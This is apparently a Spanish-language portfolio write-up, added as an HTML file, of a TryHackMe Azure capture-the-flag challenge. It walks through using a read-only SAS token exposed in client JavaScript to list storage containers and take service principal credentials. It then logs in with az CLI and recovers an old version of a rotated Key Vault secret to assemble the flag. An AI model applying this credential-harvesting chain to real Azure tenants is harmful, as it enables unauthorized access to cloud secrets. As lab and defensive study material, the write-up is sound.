@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CryptoCabana Cloud — de un SAS Token expuesto a los secretos del Key Vault · Portfolio</title>
+<meta name="post:titulo" content="CryptoCabana Cloud — de un SAS Token expuesto a los secretos del Key Vault">
+<meta name="post:fecha" content="2026-08-05">
+<meta name="post:resumen" content="Un SAS Token con permisos de lectura expuesto en el JavaScript de la app permite enumerar un storage account de Azure, descargar credenciales de una cuenta de automatización y usarlas para entrar en el Key Vault, donde una versión antigua de un secreto rotado permite reconstruir la flag completa.">
+<meta name="post:tags" content="Azure, SAS Token, Key Vault, Service Principal">
+<meta name="post:plataforma" content="TryHackMe">
+<meta name="description" content="Writeup de Salvador Navarro.">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, noai, noimageai">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23050b17'/%3E%3Ctext x='32' y='47' font-size='44' font-family='monospace' font-weight='bold' text-anchor='middle' fill='%237a8f3a'%3ES%3C/text%3E%3C/svg%3E">
+</head>
+<body>
+
+<header>
+  <a class="logo" href="../index.html">PortFolio</a>
+  <nav>
+    <a href="../index.html">Inicio</a>
+    <div class="dd">
+      <a href="#" class="dd-t">Categorías ▾</a>
+      <div class="dd-m">
+        <a href="../index.html?tipo=Reto">Retos</a>
+        <a href="../index.html?tipo=Proyecto">Proyectos</a>
+        <a href="../index.html?tipo=Estudio">Estudios</a>
+      </div>
+    </div>
+    <a href="../sobremi/sobremi.html">Sobre mí</a>
+  </nav>
+</header>
+
+<main class="reto">
+  <a class="volver" href="../index.html#posts">← Volver a los posts</a>
+
+  <h1>CryptoCabana Cloud — de un SAS Token expuesto a los secretos del Key Vault</h1>
+  <div class="ficha">
+    <span><strong>Fecha:</strong> 5 ago 2026</span>
+    <span><strong>Categoría:</strong> Cloud / Azure</span>
+    <span><strong>Sistema:</strong> Azure (Storage Account + Key Vault)</span>
+    <span><strong>Plataforma:</strong> TryHackMe (HackerHolidays · Byte Lotus · Día 9)</span>
+  </div>
+
+  <h2>Resumen</h2>
+  <p>El escenario describe un servicio de backup de seed phrases alojado en Azure que prometía seguridad con el
+  mensaje "Backed up. Sleep easy." El objetivo era descubrir qué identidad utiliza la aplicación para acceder al
+  almacenamiento y comprobar hasta dónde llegan sus permisos. Un SAS Token de solo lectura expuesto en el
+  JavaScript del cliente permite enumerar la cuenta de almacenamiento y descargar las credenciales de una cuenta
+  de automatización, con las que se accede al Key Vault asociado; una versión antigua de un secreto ya rotado
+  permite reconstruir la flag completa.</p>
+
+  <h2>Artefactos y herramientas</h2>
+  <ul>
+    <li>Código JavaScript del cliente — expone el SAS Token y el storage account</li>
+    <li>API REST de Azure Blob Storage — enumeración de contenedores con el SAS Token</li>
+    <li><code>az</code> (Azure CLI) — login con Service Principal y enumeración del Key Vault</li>
+  </ul>
+
+  <h2>Análisis</h2>
+
+  <h3>1. Análisis del código JavaScript</h3>
+  <div class="pregunta"><b>Objetivo:</b> localizar credenciales o tokens expuestos en el cliente.</div>
+  <p>Inspeccionando el código fuente de la aplicación aparecen el storage account, el contenedor y un SAS Token
+  completo:</p>
+  <pre><code>const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
+const BACKUPS_CONTAINER = "backups";
+
+const BACKUP_SAS =
+"?sv=2022-11-02&ss=b&srt=sco&sp=rl&...";</code></pre>
+  <p>El parámetro <code>sp=rl</code> del SAS indica permisos de <strong>Read</strong> y <strong>List</strong>
+  únicamente — no existían permisos de escritura.</p>
+
+  <h3>2. Enumeración de contenedores</h3>
+  <div class="pregunta"><b>Objetivo:</b> listar los contenedores accesibles con el SAS Token.</div>
+  <pre><code>https://cryptocabanaf5scjagc.blob.core.windows.net/
+?restype=container
+&comp=list
+&SAS_TOKEN</code></pre>
+  <p>Respuesta obtenida:</p>
+  <pre><code>$web
+backups
+vault</code></pre>
+  <p>El contenedor más interesante era <code>vault</code>.</p>
+
+  <h3>3. Enumeración del contenedor vault</h3>
+  <div class="pregunta"><b>Objetivo:</b> ver qué archivos contiene el contenedor vault.</div>
+  <pre><code>https://cryptocabanaf5scjagc.blob.core.windows.net/vault
+?restype=container
+&comp=list
+&SAS_TOKEN</code></pre>
+  <p>Resultado:</p>
+  <pre><code>backup-service-account.json
+seed_phrase.txt</code></pre>
+
+  <h3>4. Obtención de credenciales</h3>
+  <div class="pregunta"><b>Objetivo:</b> extraer credenciales válidas del archivo de la cuenta de servicio.</div>
+  <p>Descargando <code>backup-service-account.json</code> se encuentran credenciales válidas:</p>
+  <pre><code>{
+  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
+  "client_secret": "REDACTED",
+  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
+  "key_vault_name": "ccabana-kv-f5scjagc"
+}</code></pre>
+  <p>La nota asociada ("Rotate this if it ever leaves the vault.") confirma que se trata de una cuenta de
+  automatización utilizada por la propia aplicación.</p>
+
+  <h3>5. Acceso mediante Service Principal</h3>
+  <div class="pregunta"><b>Objetivo:</b> autenticarse en Azure con las credenciales obtenidas.</div>
+  <pre><code>az login --service-principal \
+  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
+  -p &lt;client_secret&gt; \
+  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c</code></pre>
+  <p class="respuesta"><b>Resultado:</b> autenticación exitosa como la cuenta de automatización.</p>
+
+  <h3>6. Enumeración de Azure Key Vault</h3>
+  <div class="pregunta"><b>Objetivo:</b> listar los secretos disponibles en el Key Vault asociado.</div>
+  <pre><code>az keyvault secret list \
+  --vault-name ccabana-kv-f5scjagc \
+  -o table</code></pre>
+  <p>Resultado:</p>
+  <pre><code>key-shard-1
+key-shard-2
+key-shard-3
+master-key</code></pre>
+
+  <h3>7. Recuperación de los fragmentos</h3>
+  <div class="pregunta"><b>Objetivo:</b> leer el valor de cada fragmento de la flag.</div>
+  <pre><code># Shard 1
+THM{n0t_ur
+
+# Shard 2
+Rotated this after IT flagged it --
+old value should still be recoverable if you know where to look.
+
+# Shard 3
+ur_c01ns!}</code></pre>
+  <p>El segundo secreto resulta estar rotado: su valor actual ya no es el fragmento de la flag, sino una pista
+  apuntando a su versión anterior.</p>
+
+  <h3>8. Enumeración de versiones antiguas</h3>
+  <div class="pregunta"><b>Objetivo:</b> recuperar el valor anterior a la rotación de key-shard-2.</div>
+  <pre><code>az keyvault secret list-versions \
+  --vault-name ccabana-kv-f5scjagc \
+  --name key-shard-2</code></pre>
+  <p>Existían dos versiones. Se identifica la más antigua:</p>
+  <pre><code>3d6492d2c6f74123bc754a9ded22b2a0</code></pre>
+  <p>Y se recupera su valor:</p>
+  <pre><code>az keyvault secret show \
+  --vault-name ccabana-kv-f5scjagc \
+  --name key-shard-2 \
+  --version 3d6492d2c6f74123bc754a9ded22b2a0</code></pre>
+  <p>Resultado:</p>
+  <pre><code>_k3ys_n0t_</code></pre>
+
+  <h3>9. Reconstrucción de la flag</h3>
+  <pre><code>THM{n0t_ur
+_k3ys_n0t_
+ur_c01ns!}</code></pre>
+  <p class="respuesta"><b>Flag:</b> <code>THM{n0t_ur_k3ys_n0t_ur_c01ns!}</code></p>
+
+  <h2>Cadena de ataque (kill chain)</h2>
+  <table>
+    <tr><th>#</th><th>Paso</th></tr>
+    <tr><td>1</td><td>SAS Token de solo lectura expuesto en el JavaScript del cliente</td></tr>
+    <tr><td>2</td><td>Enumeración del storage account: contenedores $web, backups y vault</td></tr>
+    <tr><td>3</td><td>Enumeración de vault: backup-service-account.json y seed_phrase.txt</td></tr>
+    <tr><td>4</td><td>Descarga de credenciales de una cuenta de automatización (Service Principal)</td></tr>
+    <tr><td>5</td><td>Login en Azure CLI con el Service Principal</td></tr>
+    <tr><td>6</td><td>Enumeración del Key Vault asociado: cuatro secretos (3 shards + master-key)</td></tr>
+    <tr><td>7</td><td>Lectura de los tres shards; key-shard-2 aparece ya rotado</td></tr>
+    <tr><td>8</td><td>Enumeración de versiones antiguas de key-shard-2 y recuperación del valor previo a la rotación</td></tr>
+    <tr><td>9</td><td>Reconstrucción de la flag a partir de los tres fragmentos</td></tr>
+  </table>
+
+  <h2>Conclusiones</h2>
+  <p>Los SAS Tokens mal configurados o incrustados en código del cliente pueden exponer almacenamiento sensible
+  aunque solo tengan permisos de lectura, porque "solo lectura" sigue permitiendo descargar credenciales de otras
+  cuentas con más privilegios. Las cuentas de automatización suelen tener acceso privilegiado y conviene tratarlas
+  con el mismo cuidado que una cuenta humana. Además, rotar un secreto en Azure Key Vault no elimina
+  necesariamente las versiones anteriores: si no se purgan explícitamente, siguen siendo recuperables por
+  cualquiera con permisos de lectura sobre el histórico de versiones, lo que puede anular por completo el
+  propósito de la rotación.</p>
+</main>
+
+<footer>© <span id="year"></span> Salvador Navarro · Portfolio · Writeups · Proyectos</footer>
+<script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+</html>
